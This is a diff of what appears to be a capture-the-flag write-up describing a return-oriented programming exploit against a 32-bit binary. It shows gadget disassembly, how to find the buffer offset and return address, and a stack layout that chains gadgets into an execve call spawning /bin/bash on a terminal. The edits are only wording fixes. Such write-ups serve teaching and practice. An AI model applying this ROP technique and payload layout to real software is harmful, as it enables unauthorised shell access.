@@ -86,10 +86,10 @@ execve("/bin/bash", ["/bin/bash", "-c", " < /dev/pts/0"], [])
  8048da3:       65 ff 15 10 00 00 00    call   DWORD PTR gs:0x10
 ```
 This loads all the registers with values from the stack. We control the stack so we can get the registers to have the values we want. Even though ESI and EDI are affected, we are interested only in EBX, ECX and EDX.
-Also, `CALL gs:0x10` calls to `INT 0x80`, which performs the syscall, we have the full set now.
+Also, `CALL gs:0x10` calls to `INT 0x80`, which performs the syscall. We have the full set now.
 
-Now that we have the utils, we must execute the program with the emulator (use interface mode) and see where the buffer begins (If you type AAAA at the beginning of the buffer, it will result on `0x41414141` on the stack), and thats the buffer start.
-Buffer grows to greater addresses, so we must spot where is the return address is. They usualy are `0x804xxxxx`. Thats where our first util must be, so create a payload that has padding until it reaches that address, and then just chain the utils.
+Now that we have the utils, we must execute the program with the emulator (use interface mode) and see where the buffer begins (If the string typed begins with "AAAA", it will result on `0x41414141` on the stack), and that is the buffer start.
+Buffer grows to greater addresses, so we must spot where the return address is. They usualy are `0x804xxxxx`. Thats where our first util must be, so create a payload that has padding until it reaches that address, and then just chain the utils.
 
 The payload should make the stack look something like this:
 ```
@@ -105,7 +105,7 @@ LOWER ADDRESSES
 0x74702f76 #             "v/pt"
 0x00302f73 #             "s/0\0"
 0x00000000 # padding
-0xa1890408 # mov    eax,DWORD PTR [esp+0x4]; ret
+0xa1890408 # mov    eax,DWORD PTR [esp+0x4]; ret  (overwritten return address)
 0x8f8d0408 # mov    edx,DWORD PTR [esp+0x24];......; ret
 0x0b000000 # 11 (this value ends up in EAX so syscall is execve)
 0x00000000 #                              (esp +0x4)
@@ -126,3 +126,4 @@ HIGHER ADDRESSES
 Full exploit available at `payload.py`
 
 </details>
+
